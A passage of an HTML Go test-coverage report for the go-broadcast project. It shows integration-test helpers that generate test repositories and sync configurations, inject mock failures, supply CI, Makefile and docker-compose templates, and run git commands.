// CreateNetworkFailureScenario creates a scenario for testing network resilience
func (g *TestRepoGenerator) CreateNetworkFailureScenario() (*TestScenario, error) <span class="cov8" title="1">{
        scenario, err := g.CreateComplexScenario()
        if err != nil </span><span class="cov0" title="0">{
                return nil, err
        }</span>

        <span class="cov8" title="1">scenario.Name = "Network Failure Resilience"
        scenario.Description = "Tests network interruption and rate limiting scenarios"

        return scenario, nil</span>
}

// CreateBranchProtectionScenario creates a scenario for testing branch protection
func (g *TestRepoGenerator) CreateBranchProtectionScenario() (*TestScenario, error) <span class="cov8" title="1">{
        scenario, err := g.CreateComplexScenario()
        if err != nil </span><span class="cov0" title="0">{
                return nil, err
        }</span>

        <span class="cov8" title="1">scenario.Name = "Branch Protection Testing"
        scenario.Description = "Tests sync behavior with protected branches and required reviews"

        // Branch protection is handled at the repository level, not in config
        // The sync engine will detect protected branches via GitHub API calls

        return scenario, nil</span>
}

// MockFailureInjector provides controlled failure injection for testing
type MockFailureInjector struct {
        FailureMode   FailureMode
        FailureRate   float64 // 0.0 to 1.0
        FailureCount  int
        FailureRepos  []string
        RecoveryDelay time.Duration
}

// ShouldFail determines if an operation should fail based on the injector configuration
func (m *MockFailureInjector) ShouldFail(_ context.Context, repo, _ string) bool <span class="cov8" title="1">{
        if m.FailureMode == FailureNone </span><span class="cov8" title="1">{
                return false
        }</span>

        // Check if this repo is in the failure list
        <span class="cov8" title="1">if len(m.FailureRepos) &gt; 0 </span><span class="cov8" title="1">{
                found := false
                for _, failRepo := range m.FailureRepos </span><span class="cov8" title="1">{
                        if strings.Contains(repo, failRepo) </span><span class="cov8" title="1">{
                                found = true
                                break</span>
                        }
                }
                <span class="cov8" title="1">if !found </span><span class="cov8" title="1">{
                        return false
                }</span>
        }

        // Check failure count
        <span class="cov8" title="1">if m.FailureCount &gt; 0 </span><span class="cov8" title="1">{
                m.FailureCount--
                return true
        }</span>

        // Check failure rate
        <span class="cov8" title="1">if m.FailureRate &gt; 0 </span><span class="cov8" title="1">{
                return (float64(time.Now().UnixNano()%1000) / 1000.0) &lt; m.FailureRate
        }</span>

        <span class="cov8" title="1">return false</span>
}

// GetFailureError returns an appropriate error for the failure mode
func (m *MockFailureInjector) GetFailureError(operation string) error <span class="cov8" title="1">{
        switch m.FailureMode </span>{
        case FailureNetwork:<span class="cov8" title="1">
                return fmt.Errorf("%w during %s", ErrNetworkTimeout, operation)</span>
        case FailureAuth:<span class="cov8" title="1">
                return fmt.Errorf("%w for %s", ErrAuthenticationFailed, operation)</span>
        case FailureRateLimit:<span class="cov8" title="1">
                return fmt.Errorf("%w for %s", ErrRateLimitExceeded, operation)</span>
        case FailurePartial:<span class="cov8" title="1">
                return fmt.Errorf("%w during %s", ErrPartialFailure, operation)</span>
        case FailureCorruption:<span class="cov8" title="1">
                return fmt.Errorf("%w during %s", ErrDataCorruption, operation)</span>
        case FailureTimeout:<span class="cov8" title="1">
                return fmt.Errorf("%w: %s took too long", ErrOperationTimeout, operation)</span>
        default:<span class="cov8" title="1">
                return fmt.Errorf("%w during %s", ErrUnknownFailure, operation)</span>
        }
}

// Cleanup removes all generated test data
func (g *TestRepoGenerator) Cleanup() error <span class="cov8" title="1">{
        if g.BaseDir != "" </span><span class="cov8" title="1">{
                return os.RemoveAll(g.BaseDir)
        }</span>
        <span class="cov8" title="1">return nil</span>
}

// generateCommitSHA creates a realistic-looking commit SHA for testing
func generateCommitSHA() string <span class="cov8" title="1">{
        bytes := make([]byte, 20)
        _, err := rand.Read(bytes)
        if err != nil </span><span class="cov0" title="0">{
                // Fallback to time-based generation
                return fmt.Sprintf("%x", time.Now().UnixNano())[:40]
        }</span>
        <span class="cov8" title="1">return fmt.Sprintf("%x", bytes)</span>
}

// GenerateTestConfig creates a test configuration that can be either old or new format
// This helper allows tests to work with both configuration styles during transition
func (g *TestRepoGenerator) GenerateTestConfig(sourceRepo, sourceBranch string, targetRepos []*TestRepository) *config.Config <span class="cov8" title="1">{
        // For now, return old format for backward compatibility
        // Tests can be gradually updated to use group format
        return g.GenerateOldFormatConfig(sourceRepo, sourceBranch, targetRepos)
}</span>

// GenerateOldFormatConfig creates a configuration using the old format
func (g *TestRepoGenerator) GenerateOldFormatConfig(sourceRepo, sourceBranch string, targetRepos []*TestRepository) *config.Config <span class="cov8" title="1">{
        targets := []config.TargetConfig{}

        for _, repo := range targetRepos </span><span class="cov8" title="1">{
                target := config.TargetConfig{
                        Repo: fmt.Sprintf("%s/%s", repo.Owner, repo.Name),
                        Files: []config.FileMapping{
                                {Src: ".github/workflows/ci.yml", Dest: ".github/workflows/ci.yml"},
                                {Src: "Makefile", Dest: "Makefile"},
                        },
                        Transform: config.Transform{
                                RepoName:  true,
                                Variables: map[string]string{"SERVICE_NAME": repo.Name},
                        },
                }

                // Add extra files for some repos
                switch repo.Name </span>{
                case "service-b":<span class="cov8" title="1">
                        target.Files = append(target.Files, config.FileMapping{
                                Src: "README.md", Dest: "README.md",
                        })</span>
                case "service-c":<span class="cov8" title="1">
                        target.Files = []config.FileMapping{
                                {Src: ".github/workflows/ci.yml", Dest: ".github/workflows/ci.yml"},
                                {Src: "docker-compose.yml", Dest: "docker-compose.yml"},
                        }</span>
                }

                <span class="cov8" title="1">targets = append(targets, target)</span>
        }

        <span class="cov8" title="1">return &amp;config.Config{
                Version: 1,
                Groups: []config.Group{{
                        Name:     "test-group",
                        ID:       "test-group",
                        Priority: 1,
                        Enabled:  &amp;[]bool{true}[0],
                        Source: config.SourceConfig{
                                Repo:   sourceRepo,
                                Branch: sourceBranch,
                        },
                        Defaults: config.DefaultConfig{
                                BranchPrefix: "chore/sync-files",
                                PRLabels:     []string{"automated-sync", "integration-test"},
                        },
                        Targets: targets,
                }},
        }</span>
}

// GenerateGroupFormatConfig creates a configuration using the new group format
func (g *TestRepoGenerator) GenerateGroupFormatConfig(sourceRepo, sourceBranch string, targetRepos []*TestRepository) *config.Config <span class="cov0" title="0">{
        targets := []config.TargetConfig{}

        for _, repo := range targetRepos </span><span class="cov0" title="0">{
                target := config.TargetConfig{
                        Repo: fmt.Sprintf("%s/%s", repo.Owner, repo.Name),
                        Files: []config.FileMapping{
                                {Src: ".github/workflows/ci.yml", Dest: ".github/workflows/ci.yml"},
                                {Src: "Makefile", Dest: "Makefile"},
                        },
                        Transform: config.Transform{
                                RepoName:  true,
                                Variables: map[string]string{"SERVICE_NAME": repo.Name},
                        },
                }

                // Add extra files for some repos
                switch repo.Name </span>{
                case "service-b":<span class="cov0" title="0">
                        target.Files = append(target.Files, config.FileMapping{
                                Src: "README.md", Dest: "README.md",
                        })</span>
                case "service-c":<span class="cov0" title="0">
                        target.Files = []config.FileMapping{
                                {Src: ".github/workflows/ci.yml", Dest: ".github/workflows/ci.yml"},
                                {Src: "docker-compose.yml", Dest: "docker-compose.yml"},
                        }</span>
                }

                <span class="cov0" title="0">targets = append(targets, target)</span>
        }

        <span class="cov0" title="0">return &amp;config.Config{
                Version: 1,
                Groups: []config.Group{
                        {
                                Name:     "default",
                                ID:       "default",
                                Priority: 0,
                                Enabled:  boolPtr(true),
                                Source: config.SourceConfig{
                                        Repo:   sourceRepo,
                                        Branch: sourceBranch,
                                },
                                Defaults: config.DefaultConfig{
                                        BranchPrefix: "chore/sync-files",
                                        PRLabels:     []string{"automated-sync", "integration-test"},
                                },
                                Targets: targets,
                        },
                },
        }</span>
}

// boolPtr is a helper function to create a pointer to a boolean value
func boolPtr(b bool) *bool <span class="cov0" title="0">{
        return &amp;b
}</span>

// Standard file templates for test repositories

func getStandardCIWorkflow() string <span class="cov8" title="1">{
        return `name: CI
on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v3
    - name: Set up Go
      uses: actions/setup-go@v3
      with:
        go-version: 1.21
    - name: Run tests
      run: make test
    - name: Run linter
      run: make lint`
}</span>

func getStandardReleaseWorkflow() string <span class="cov8" title="1">{
        return `name: Release
on:
  push:
    tags:
      - 'v*'

jobs:
  release:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v3
    - name: Create Release
      uses: actions/create-release@v1
      env:
        GITHUB_TOKEN: ${{ secrets.GH_PAT_TOKEN || secrets.GITHUB_TOKEN }}
      with:
        tag_name: ${{ github.ref }}
        release_name: Release ${{ github.ref }}`
}</span>

func getStandardMakefile() string <span class="cov8" title="1">{
        return `# Template Makefile
.PHONY: test build lint clean

test:
        go test -v ./...

build:
        go build -o bin/app ./cmd/app

lint:
        golangci-lint run

clean:
        rm -rf bin/`
}</span>

func getStandardDockerCompose() string <span class="cov8" title="1">{
        return `version: '3.8'

services:
  app:
    build: .
    ports:
      - "8080:8080"
    environment:
      - ENV=development

  postgres:
    image: postgres:13
    environment:
      POSTGRES_DB: appdb
      POSTGRES_USER: user
      POSTGRES_PASSWORD: password
    ports:
      - "5432:5432"`
}</span>

func getStandardSetupScript() string <span class="cov8" title="1">{
        return `#!/bin/bash
# Setup script for development environment

set -e

echo "Setting up development environment..."

# Install dependencies
go mod download

# Run initial tests
make test

echo "Setup complete!"`
}</span>
</pre>

		<pre class="file" id="file89" style="display: none">// Package helpers provides test utilities for the go-broadcast integration tests.
package helpers

import (
        "os"
        "testing"
)

// GetGitHubToken returns the GitHub token from environment variables.
// It checks GH_PAT_TOKEN first (preferred), then falls back to GITHUB_TOKEN.
func GetGitHubToken() string <span class="cov8" title="1">{
        if token := os.Getenv("GH_PAT_TOKEN"); token != "" </span><span class="cov8" title="1">{
                return token
        }</span>
        <span class="cov8" title="1">return os.Getenv("GITHUB_TOKEN")</span>
}

// SkipIfNoGitHubAuth skips the test if GitHub authentication is not available.
// This allows tests to run in CI environments without GitHub authentication.
func SkipIfNoGitHubAuth(t *testing.T) <span class="cov8" title="1">{
        t.Helper()
        if GetGitHubToken() == "" </span><span class="cov8" title="1">{
                t.Skip("GH_PAT_TOKEN or GITHUB_TOKEN not set, skipping test that requires GitHub authentication")
        }</span>
}
</pre>

		<pre class="file" id="file90" style="display: none">package helpers

import (
        "os"
        "os/exec"
        "strings"
        "testing"
)

// SkipIfNoGit skips the test if git is not available
func SkipIfNoGit(t *testing.T) <span class="cov0" title="0">{
        t.Helper()
        if _, err := exec.LookPath("git"); err != nil </span><span class="cov0" title="0">{
                t.Skip("git is not available")
        }</span>
}

// InitGitRepo initializes a git repository in the given directory
func InitGitRepo(dir, initialCommitMsg string) error <span class="cov0" title="0">{
        // Initialize git repository
        cmd := exec.Command("git", "init")
        cmd.Dir = dir
        if err := cmd.Run(); err != nil </span><span class="cov0" title="0">{
                return err
        }</span>

        // Configure git user
        <span class="cov0" title="0">cmd = exec.Command("git", "config", "user.name", "Test User")
        cmd.Dir = dir
        if err := cmd.Run(); err != nil </span><span class="cov0" title="0">{
                return err
        }</span>

        <span class="cov0" title="0">cmd = exec.Command("git", "config", "user.email", "test@example.com")
        cmd.Dir = dir
        if err := cmd.Run(); err != nil </span><span class="cov0" title="0">{
                return err
        }</span>

        // Create initial commit
        <span class="cov0" title="0">cmd = exec.Command("git", "commit", "--allow-empty", "-m", initialCommitMsg)
        cmd.Dir = dir
        return cmd.Run()</span>
}

// CommitChanges adds and commits all changes in the repository
func CommitChanges(dir, commitMsg string) error <span class="cov0" title="0">{
        cmd := exec.Command("git", "add", ".")
        cmd.Dir = dir
        if err := cmd.Run(); err != nil </span><span class="cov0" title="0">{
                return err
        }</span>

        <span class="cov0" title="0">cmd = exec.Command("git", "commit", "-m", commitMsg)
        cmd.Dir = dir
        return cmd.Run()</span>
}

// GetLatestCommit returns the SHA of the latest commit
func GetLatestCommit(dir string) (string, error) <span class="cov0" title="0">{
        cmd := exec.Command("git", "rev-parse", "HEAD")
        cmd.Dir = dir
        output, err := cmd.Output()
        if err != nil </span><span class="cov0" title="0">{
                return "", err
        }</span>
        <span class="cov0" title="0">return strings.TrimSpace(string(output)), nil</span>
}

// CreateBranch creates a new git branch
func CreateBranch(dir, branchName string) error <span class="cov0" title="0">{
        cmd := exec.Command("git", "checkout", "-b", branchName)
        cmd.Dir = dir
        return cmd.Run()
}</span>

// FileExists checks if a file exists
func FileExists(filePath string) (bool, error) <span class="cov0" title="0">{
        _, err := os.Stat(filePath)
        if err == nil </span><span class="cov0" title="0">{
                return true, nil
        }</span>
        <span class="cov0" title="0">if os.IsNotExist(err) </span><span class="cov0" title="0">{
                return false, nil
        }</span>
        <span class="cov0" title="0">return false, err</span>
}
</pre>

		</div>
	</body>
	<script>
	(function() {
		var files = document.getElementById('files');
		var visible;
		files.addEventListener('change', onChange, false);
		function select(part) {
			if (visible)
				visible.style.display = 'none';
			visible = document.getElementById(part);
			if (!visible)
				return;
			files.value = part;
			visible.style.display = 'block';
			location.hash = part;
		}
		function onChange() {
			select(files.value);
			window.scrollTo(0, 0);
		}
		if (location.hash != "") {
			select(location.hash.substr(1));
		}
		if (!visible) {
			select("file0");
		}
	})();
	</script>
</html>
